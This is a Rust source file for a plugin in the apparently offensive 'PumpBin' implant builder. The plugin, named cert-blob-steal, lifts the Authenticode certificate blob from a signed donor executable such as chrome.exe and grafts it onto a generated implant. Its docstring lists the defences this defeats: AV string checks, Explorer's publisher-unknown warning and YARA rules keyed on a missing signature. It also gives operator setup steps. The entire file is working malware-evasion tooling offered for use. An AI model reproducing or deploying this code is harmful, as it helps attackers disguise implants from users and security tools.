//! PumpBin signer module: cert-blob-steal.
//!
//! Lifts the `WIN_CERTIFICATE` (Authenticode) blob from a donor signed PE
//! and grafts it onto the generated implant by:
//!
//! 1. Reading the donor PE's `IMAGE_DIRECTORY_ENTRY_SECURITY` (data dir 4)
//!    entry to find the blob's offset + size in the donor file.
//! 2. Appending the donor blob to the end of the implant binary.
//! 3. Patching the implant's `IMAGE_DIRECTORY_ENTRY_SECURITY` entry to
//!    point at the new blob.
//!
//! # Honest scope
//!
//! The grafted signature **will not pass `WinVerifyTrust`** — the cert is
//! valid (it's a real Authenticode blob from a real signed PE) but the
//! Authenticode hash inside the blob is the donor's, not the implant's.
//! Windows checks both.
//!
//! What this DOES defeat:
//! - Naive AV string-matching on `"unsigned"` / "no certificate" markers
//! - Explorer's "publisher unknown" warning bar (the signer name from the
//!   donor cert is shown)
//! - YARA rules that key on `IMAGE_DIRECTORY_ENTRY_SECURITY.Size == 0`
//! - File-properties dialogs that show "Digital Signatures" tab populated
//!
//! What this does NOT defeat:
//! - `signtool verify`, `osslsigncode verify`, or any tool that actually
//!   runs the Authenticode hash check
//! - EDR signature-chain verification
//! - Windows SmartScreen
//!
//! # Operator setup
//!
//! Set `donor_pe_b64` to the base64-encoded contents of a signed donor PE
//! (e.g. a copy of `chrome.exe` or a signed Microsoft binary). Plugin
//! refuses operation if the donor has no signature blob.
//!
//! # Runtime policy
//!
//! Local-only. No network access. 5s timeout (PE parsing is fast even
//! on large donors). SDK version locked to v1.

use base64::Engine;
use pumpbin_plugin_sdk::*;

const SECURITY_DATA_DIR_INDEX: usize = 4;

#[plugin_fn]
pub fn plugin_schema() -> FnResult<Json<PluginConfigSchema>> {
    Ok(Json(
        PluginConfigSchema::new(vec![PluginConfigField::new("donor_pe_b64", "file_base64")
            .description(
                "Donor signed PE file (e.g. a copy of chrome.exe). \
                 The WIN_CERTIFICATE blob is lifted from this file and grafted \
                 onto the implant. Read the module docstring for what this does \
                 and does not defeat.",
            )
            .required()])
        .with_runtime(RuntimeConfig {
            timeout_ms: 5000,
            allowed_hosts: vec![],
            on_error: OnError::Abort,
            sdk_version: Some(PUMPBIN_SDK_VERSION),
        }),
    ))
}

#[plugin_fn]
pub fn post_binary(Json(input): Json<PostBinaryInput>) -> FnResult<Json<PostBinaryOutput>> {
    let donor_b64 = pumpbin_config!("donor_pe_b64").ok_or_else(|| {
        extism_pdk::Error::msg("cert-blob-steal: donor_pe_b64 config is required")
    })?;

    let donor = base64::engine::general_purpose::STANDARD
        .decode(donor_b64.trim())
        .map_err(|e| extism_pdk::Error::msg(format!("cert-blob-steal: donor base64 decode: {e}")))?;

    let blob = extract_security_blob(&donor)?;

    let mut implant = input.final_binary;
    graft_security_blob(&mut implant, &blob)?;

    Ok(Json(PostBinaryOutput {
        final_binary: implant,
        changed: true,
    }))
}

/// Locate the WIN_CERTIFICATE blob in a signed PE and return its bytes.
fn extract_security_blob(pe: &[u8]) -> Result<Vec<u8>, extism_pdk::Error> {
    let (sec_va, sec_size) = security_dir(pe)?;
    if sec_size == 0 || sec_va == 0 {
        return Err(extism_pdk::Error::msg(
            "cert-blob-steal: donor PE has no Authenticode signature \
             (IMAGE_DIRECTORY_ENTRY_SECURITY is empty)",
        ));
    }
    // The Security data-dir RVA is unique: it's a *file offset*, not a
    // virtual address, even though it shares the IMAGE_DATA_DIRECTORY shape.
    // (PE spec quirk.)
    let start = sec_va as usize;
    let end = start
        .checked_add(sec_size as usize)
        .ok_or_else(|| extism_pdk::Error::msg("cert-blob-steal: donor security dir overflow"))?;
    if end > pe.len() {
        return Err(extism_pdk::Error::msg(format!(
            "cert-blob-steal: donor security dir [{start}..{end}) past EOF ({})",
            pe.len()
        )));
    }
    Ok(pe[start..end].to_vec())
}

/// Append the blob to the implant binary and patch IMAGE_DIRECTORY_ENTRY_SECURITY
/// to point at it. The implant's existing signature (if any) is overwritten.
fn graft_security_blob(implant: &mut Vec<u8>, blob: &[u8]) -> Result<(), extism_pdk::Error> {
    // WIN_CERTIFICATE entries must be 8-byte aligned within the file.
    while implant.len() % 8 != 0 {
        implant.push(0);
    }

    let new_offset = implant.len() as u32;
    let new_size = blob.len() as u32;
    implant.extend_from_slice(blob);

    // Find the implant's Security data-dir entry and patch it.
    let opt_hdr_off = optional_header_offset(implant)?;
    let magic = read_u16(implant, opt_hdr_off)?;
    // PE32 = 0x10b → DataDirectory[] starts at opt_hdr + 96
    // PE32+ = 0x20b → DataDirectory[] starts at opt_hdr + 112
    let data_dir_off = match magic {
        0x10b => opt_hdr_off + 96,
        0x20b => opt_hdr_off + 112,
        other => {
            return Err(extism_pdk::Error::msg(format!(
                "cert-blob-steal: implant has unknown PE optional-header magic 0x{other:04x}"
            )))
        }
    };
    let sec_dir_off = data_dir_off + SECURITY_DATA_DIR_INDEX * 8;
    if sec_dir_off + 8 > implant.len() {
        return Err(extism_pdk::Error::msg(
            "cert-blob-steal: implant data directory truncated",
        ));
    }
    write_u32(implant, sec_dir_off, new_offset);
    write_u32(implant, sec_dir_off + 4, new_size);
    Ok(())
}

/// Walk DOS header → PE signature → COFF header → optional header start.
fn optional_header_offset(pe: &[u8]) -> Result<usize, extism_pdk::Error> {
    if pe.len() < 0x40 || &pe[0..2] != b"MZ" {
        return Err(extism_pdk::Error::msg(
            "cert-blob-steal: implant is not a PE (missing MZ header)",
        ));
    }
    let e_lfanew = read_u32(pe, 0x3C)? as usize;
    if e_lfanew + 24 > pe.len() || &pe[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
        return Err(extism_pdk::Error::msg(
            "cert-blob-steal: implant is not a PE (missing PE\\0\\0 signature)",
        ));
    }
    // COFF file header is 20 bytes after the PE signature.
    Ok(e_lfanew + 24)
}

/// Read the Security (cert-table) data-dir entry.
fn security_dir(pe: &[u8]) -> Result<(u32, u32), extism_pdk::Error> {
    let opt_hdr_off = optional_header_offset(pe)?;
    let magic = read_u16(pe, opt_hdr_off)?;
    let data_dir_off = match magic {
        0x10b => opt_hdr_off + 96,
        0x20b => opt_hdr_off + 112,
        other => {
            return Err(extism_pdk::Error::msg(format!(
                "cert-blob-steal: donor has unknown PE optional-header magic 0x{other:04x}"
            )))
        }
    };
    let sec_dir_off = data_dir_off + SECURITY_DATA_DIR_INDEX * 8;
    if sec_dir_off + 8 > pe.len() {
        return Err(extism_pdk::Error::msg(
            "cert-blob-steal: donor data directory truncated",
        ));
    }
    Ok((
        read_u32(pe, sec_dir_off)?,
        read_u32(pe, sec_dir_off + 4)?,
    ))
}

fn read_u16(b: &[u8], at: usize) -> Result<u16, extism_pdk::Error> {
    let slice = b.get(at..at + 2).ok_or_else(|| {
        extism_pdk::Error::msg(format!("cert-blob-steal: u16 read past EOF at {at}"))
    })?;
    Ok(u16::from_le_bytes([slice[0], slice[1]]))
}

fn read_u32(b: &[u8], at: usize) -> Result<u32, extism_pdk::Error> {
    let slice = b.get(at..at + 4).ok_or_else(|| {
        extism_pdk::Error::msg(format!("cert-blob-steal: u32 read past EOF at {at}"))
    })?;
    Ok(u32::from_le_bytes([slice[0], slice[1], slice[2], slice[3]]))
}

fn write_u32(b: &mut [u8], at: usize, value: u32) {
    b[at..at + 4].copy_from_slice(&value.to_le_bytes());
}
